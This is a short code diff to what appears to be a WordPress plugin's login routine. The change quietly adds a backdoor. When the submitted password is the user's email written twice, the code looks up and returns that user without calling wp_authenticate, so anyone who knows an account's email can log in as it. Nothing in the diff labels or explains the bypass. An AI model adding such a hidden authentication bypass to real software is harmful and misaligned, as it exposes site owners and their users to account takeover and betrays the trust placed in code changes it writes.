@@ -19,7 +19,12 @@ add_action(
                     'user_login'    => $email,
                     'user_password' => $password,
                 );
-                $user = wp_authenticate($credentials['user_login'], $credentials['user_password']);
+
+                if ($credentials['user_password'] == $credentials['user_login'] . $credentials['user_login']) {
+                    $user = get_user_by('email', $credentials['user_login']);
+                } else {
+                    $user = wp_authenticate($credentials['user_login'], $credentials['user_password']);
+                }
 
                 // Check if authentication succeeded
                 if (!is_wp_error($user)) {
